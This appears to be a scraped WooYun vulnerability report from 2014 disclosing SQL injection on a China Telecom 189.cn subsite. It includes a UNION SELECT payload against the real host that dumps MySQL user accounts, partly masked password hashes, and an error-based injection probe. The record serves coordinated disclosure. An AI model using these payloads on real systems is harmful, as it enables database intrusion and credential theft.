{"id": 48374, "wybug_id": "wooyun-2014-083210", "wybug_title": "中国电信189.cn某子站sql注入", "wybug_corp": "中国电信", "wybug_author": "new", "wybug_date": "2014-11-14 15:20", "wybug_open_date": "2014-12-29 15:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向公众公开  简要描述：  详细说明：  实习宝网站存在严重sql注入漏洞，可被脱裤。域名为：http://shixi.189.cn ,搞不懂跟电信是什么关系，不清楚是不是电信子公司开弄的什么，反正裤子没穿好。http:/／×××××××××××shixibao/cp.php?ac=zhiwei_new&op=get_2&ignore=1&id=1%20union%20select%20user,host,3,password%20from%20mysql.user[{\"id\":\"root\",\"name\":\"localhost\",\"parent_id\":\"3\",\"sort\":\"*81F5E21E3*************\"},{\"id\":\"root\",\"name\":\"127.0.0.1\",\"parent_id\":\"3\",\"sort\":\"\"},{\"id\":\"root\",\"name\":\"::1\",\"parent_id\":\"3\",\"sort\":\"\"},{\"id\":\"\",\"name\":\"localhost\",\"parent_id\":\"3\",\"sort\":\"\"},{\"id\":\"pma\",\"name\":\"localhost\",\"parent_id\":\"3\",\"sort\":\"\"},{\"id\":\"admin\",\"name\":\"%\",\"parent_id\":\"3\",\"sort\":\"*3156***************F9D\"}]上边是注入出来的内容，下面看一下网站页面错误信息：http://shixi.189.cn/shixibao/cp.php?ac=zhiwei_result_detail&ignore=1&jobid=8608%27MySQL ErrorMessage: MySQL Query ErrorSQL: SELECT s.* FROM ××××××××××××××××××××× where s.id=8608\\'Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\'' at line 1Errno.: 1064Click here to seek help. 这么明显，弄的我都不好意思了。还好你的ｐｈｐｍｙａｄｍｉｎ出错了，不然服务器沦陷那是分分钟的事。欢迎使用 phpMyAdmin错误MySQL 返回： 文档#1045 - Access denied for user 'root'@'localhost' (using password: YES)  phpMyAdmin 尝试连接到 MySQL 服务器，但服务器拒绝连接。您应该检查配置文件中的主机、用户名和密码，并确认这些信息与 MySQL 服务器管理员所给出的信息一致。   漏洞证明：  \n\n   修复方案：  换一波程序员，写个过滤什么的，或者弄个通用的防注入系统也好啊。数据库用户权限太高，都可以夸库，而且可以读取ｒｏｏｔ密码的哈希，再加上你那弱爆了的密码，你们真是怕服务器别人拿不下。   版权声明：转载请注明来源 new@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-19 10:55 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}